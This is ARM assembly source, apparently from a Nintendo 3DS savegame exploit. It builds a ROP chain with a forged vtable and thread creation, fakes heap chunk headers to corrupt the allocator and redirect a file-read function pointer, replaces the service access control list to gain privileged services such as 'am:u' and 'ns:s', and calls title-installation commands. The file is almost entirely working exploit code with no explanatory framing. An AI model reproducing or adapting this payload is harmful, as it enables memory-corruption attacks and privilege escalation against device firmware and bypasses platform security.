/*ldr r4, =0x00558ad4
ldr r0, [r4]
svc 0x00000023 @ Close the "srv:" handle.
mov r0, #0
str r0, [r4]

ldr r0, =0x00558ad4 @ Output handle located where the "srv:" handle was stored.
ldr r1, =0x4e7485 @ Port name, "srv:pm"
ldr r4, =svcConnectToPort
blx r4

ldr r4, =srv_RegisterClient
blx r4*/

ldr r0, =0x14313890
ldr r1, =0x46500
ldr r2, =0x13333337

arm11_memclear:
str r2, [r0], #4
add r2, r2, #4
subs r1, r1, #4
bne arm11_memclear

add r0, r0, #0x10
ldr r1, =0x46500

arm11_memclear2:
str r2, [r0], #4
add r2, r2, #4
subs r1, r1, #4
bne arm11_memclear2

ldr r2, =GSP_CMD8//flushdcache
ldr r0, =0x14313890
ldr r1, =0x46500
lsl r1, r1, #1
add r1, r1, #0x10
blx r2

/*mov r0, sp @ Out handle
ldr r1, =(SAVEADR+SRVACCESS_OFF + 0xa*8) @ Service name ptr "ns:s".
mov r2, #4 @ Service name length
mov r3, #0
ldr r4, =srv_GetServiceHandle
blx r4
cmp r0, #0
blne throw_fatalerr

mov r0, sp
ldr r1, =0x00040030
ldr r2, =0x00009402
bl nss_launchtitle
cmp r0, #0
blne throw_fatalerr*/

mov r0, sp @ Out handle
ldr r1, =(SAVEADR+SRVACCESS_OFF + 0xb*8) @ Service name ptr "am:u"
mov r2, #4 @ Service name length
mov r3, #0
ldr r4, =srv_GetServiceHandle
blx r4
cmp r0, #0
blne throw_fatalerr

ldr r0, =0x0000CE02
ldr r1, =0x00040030
//ldr r0, =0x00021900
//ldr r1, =0x00040010
str r0, [sp, #4]
str r1, [sp, #8]

mov r0, sp
mov r1, #0
add r2, sp, #4
mov r3, #1
bl am_installtitlesfinish
cmp r0, #0
blne throw_fatalerr

/*mov r0, sp
//ldr r1, =0x4B464445
//ldr r2, =0x00048004
//mov r3, #1
ldr r1, =0x102
ldr r2, =0x00040138
mov r3, #2
bl nss_launchapplicationfirm
cmp r0, #0
blne throw_fatalerr*/

ldr r0, [sp]
svc 0x00000023

ldr r0, =0x14313890
ldr r1, =(0x46500*2 + 0x10)
mvn r2, #0

arm11_memclear4:
str r2, [r0], #4
subs r1, r1, #4
bne arm11_memclear4

ldr r2, =GSP_CMD8//flushdcache
ldr r0, =0x14313890
ldr r1, =(0x46500*2 + 0x10)
blx r2

arm11code_end:
b arm11code_end
.pool

throw_fatalerr:
ldr r1, =THROWFATALERR
bx r1
.pool

/*nss_launchtitle:
push {r4, lr}
mrc p15, 0, r4, cr13, cr0, 3
add r4, r4, #0x80

ldr r3, =0x000200C0
str r3, [r4, #0]
mov r3, r2
mov r2, r1
strd r2, [r4, #4]
mov r1, #2
str r1, [r4, #12]
ldr r0, [r0]
svc 0x00000032
cmp r0, #0
ldreq r0, [r4, #4]
pop {r4, pc}
.pool*/

/*nss_launchapplicationfirm:
push {r4, lr}
mrc p15, 0, r4, cr13, cr0, 3
add r4, r4, #0x80
str r3, [r4, #12]
ldr r3, =0x000500C0
str r3, [r4]
str r1, [r4, #4]
str r2, [r4, #8]

ldr r0, [r0]
svc 0x00000032
cmp r0, #0
ldreq r0, [r4, #4]
pop {r4, pc}
.pool*/

am_installtitlesfinish:
push {r4, r5, lr}
mrc p15, 0, r4, cr13, cr0, 3
add r4, r4, #0x80

ldr r5, =0x040E00C2
str r5, [r4, #0]
strb r1, [r4, #4]
str r3, [r4, #8]
lsl r3, r3, #7
orr r3, r3, #10
str r3, [r4, #16]
str r2, [r4, #20]
mov r1, #0
strb r1, [r4, #12]
ldr r0, [r0]
svc 0x00000032
cmp r0, #0
ldreq r0, [r4, #4]
pop {r4, r5, pc}
.pool

.space (_start + ARM11CODE_OFF + ARM11CODE_SIZE) - . @ ARM11 code section end.
#endif

#ifdef REPLACE_SRVACCESSCONTROL
.space (_start + SRVACCESS_OFF) - . @ New service access control
.ascii "APT:U"

.space (_start + SRVACCESS_OFF + 0x1*8) - .
.ascii "y2r:u"

.space (_start + SRVACCESS_OFF + 0x2*8) - .
.ascii "gsp::Gpu"

.space (_start + SRVACCESS_OFF + 0x3*8) - .
.ascii "ndm:u"

.space (_start + SRVACCESS_OFF + 0x4*8) - .
.ascii "fs:USER"

.space (_start + SRVACCESS_OFF + 0x5*8) - .
.ascii "hid:USER"

.space (_start + SRVACCESS_OFF + 0x6*8) - .
.ascii "dsp::DSP"

.space (_start + SRVACCESS_OFF + 0x7*8) - .
.ascii "cfg:u"

.space (_start + SRVACCESS_OFF + 0x8*8) - .
.ascii "fs:REG"

.space (_start + SRVACCESS_OFF + 0x9*8) - .
.ascii "ps:ps"

.space (_start + SRVACCESS_OFF + 0xa*8) - .
.ascii "ns:s"

.space (_start + SRVACCESS_OFF + 0xb*8) - .
.ascii "am:u"//"am:net"
#endif

#if EXECHAX==3
.space (_start + HEAPCHUNK_SAVEOFF) - .
.word 0x4652 @ "RF"
.word 0x150 @ Available free space following this chunk header.
.word DIFF_FILEREAD_FUNCPTR-12 @ prev memchunk ptr
.word HEAPHAX_HEAPBUF+HEAPOFF_ARM9CODE @ next memchunk ptr, arm9 code addr.

.word 0x08093920 @ Heap memctx
.word 0, 0, 0, 0, 0
.word 0x45585048
.word 0, 0, 0, 0
.word 0x00040000
.word 0x080A2EE4   
.word 0x080B5280
.word 0
.word HEAPHAX_HEAPBUF+HEAPOFF_ARM9CODE+0x200+0x88, HEAPHAX_HEAPBUF+HEAPOFF_ARM9CODE+0x200+0x88 @ RF chunk ptrs
#endif

#if EXECHAX==1
.space (_start + 0x1000) - .
.hword 0x64, 0x61, 0x74, 0x61, 0x3A, 0x2F, 0x73, 0x61, 0x76, 0x65, 0x30, 0x30, 0x2E, 0x62, 0x69, 0x6E, 0x00
.align 2
#endif

.space (_start + 0x1050) - .
.word SAVEADR+0x1054
.word SAVEADR+0x1058
.word 0, 0, 0, 0
.word REGPOPR0R3SL

#ifdef REPLACE_SRVACCESSCONTROL
.space (_start + 0x1080) - . @ srv:pm cmd
.word 0 @ ProcessID
.word 0x18 @ Service access control size, in words
.word 0x180002
.word SAVEADR+SRVACCESS_OFF @ Service access control ptr
#endif

#if EXECHAX==0
.space (_start + 0x1100) - . @ ps:ps VerifyRsaSha256 0x00020244 cmd, for FW1F
//.word 1
.word 0, 0, 0, 0, 0, 0, 0, 0 @ SHA256 hash
.word 0
.word 0x00820002 @ ((Ctx size<<14) | 2), for size 0x208.
.word SAVEADR+RSAINFO_OFF @ Ctx
.word (PSPS_SIGBUFSIZE<<4) | 10
.word 0x08000000 @ Signature
#endif

#ifdef REPLACE_FSREG_ACCESSCONTROL
.space (_start + 0x1180) - . @ cmd data for fs:REG
.word 0 @ ProcessID
.word 0x00033500, 0x00040000 @ titleID
.word 0x00033500, 0x00040000 @ 0x10-byte buf: +0 = u64 programID
.word 2 @ 0x10-byte buf: +8 = u8 mediatype
.word 0 @ 0x10-byte buf: +12 = reserved
.word 0, 0 @ exheader_storageinfo.extsavedataid
.word 0, 0 @ exheader_storageinfo.systemsavedataid
.word 0, 0 @ exheader_storageinfo.reserved
.word 0x80, 0 @ exheader_storageinfo.accessinfo and otherattributes
#endif

#if EXECHAX==3
.space (_start + 0x1180) - . @ cmd data for am:net command 0x08190108.
.word 0xa00 @ Buf0 size
.word 0xa00, 0xa00, 0xa00 + 0x3c + 8 @ Buf1size-buf3size
.word (0xa00<<4) | 10
.word HEAPHAX_INPUTBUF @ Buf0 addr
.word (0xa00<<4) | 10
.word HEAPHAX_INPUTBUF + (0xa00*1) @ Buf1 addr
.word (0xa00<<4) | 10
.word HEAPHAX_INPUTBUF + (0xa00*2) @ Buf2 addr
.word ((0xa00 + 0x3c + 8)<<4) | 10
.word HEAPHAX_INPUTBUF + (0xa00*3) @ Buf3 addr
#endif

#if EXECHAX==3
.space (_start + 0x1200) - . @ cmd data for am:net command 0x00190040 ReloadDBS.
.word 1 @ Mediatype = SD
#endif

.space (_start + 0x1280) - .
@ The r1, r2, and r3 passed to L_3508b8 from STACKMEMCPYADR are loaded from here, with r4+0x1000+0x280. r2/r3 are unused however. L_3508b8 calls vtable funcptr +4 from the inr1 class.
.word SAVEADR+0x128c @ r1, ptr to class.
.word 0, 0

.word SAVEADR+0x1290 @ Ptr to class vtable.
.word 0 @ The first vtable funcptr is unused by L_3508b8.
.word REGPOP24ADR @ Pop the data off the stack which was pushed by L_3508b8, and additionally pop the first word of data which was copied to the stack with memcpy32 into PC.

.space (_start + 0x13bc) - .
.word 2012, 10, 22 @ Datetime displayed on the save-file select screen.
.word 13, 8

#ifdef START_ROPTHREAD
.space (_start + THREADSTART_ROPCHAINOFF) - .
.word REGPOPADR
.word SAVEADR+0x104c @ r0, thread handle*
.word REGPOPADR @ r1, func entrypoint
.word 0 @ r2, thread arg r0
.word SAVEADR+0x180 @ r3, stacktop
.word 0x0f @ r4
.word 0 @ r5
.word svcCreateThread @ r6
.word 0 @ fp
.word 0 @ ip
.word BLXR6

.word 0x2d, ~1 @ d8 / sp0 threadpriority + insp4 processorid mask
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ r7
.word 0 @ r8
.word 0 @ r9
.word 0 @ sl

.word INFINLPADR
#endif

.space (_start + 0x14dc) - .

